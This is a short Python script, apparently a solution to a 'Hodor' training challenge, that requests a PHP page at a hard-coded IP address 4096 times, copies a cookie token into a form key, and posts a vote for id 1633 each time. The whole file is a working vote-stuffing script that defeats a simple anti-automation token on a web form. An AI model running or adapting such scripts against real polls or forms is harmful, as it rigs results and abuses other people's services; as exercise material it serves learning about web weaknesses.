#!/usr/bin/env python3

import json
import requests

URL = 'http://158.69.76.135/level1.php'
for i in range(4096):
    response = requests.get(URL)
    cookie = response.cookies.get_dict() #it has a dict with hodor: id
    form = {"id": "1633", "holdthedoor": "submit"}
    form["key"] = cookie["HoldTheDoor"]
    response2 = requests.post(URL, data=form, cookies=cookie)
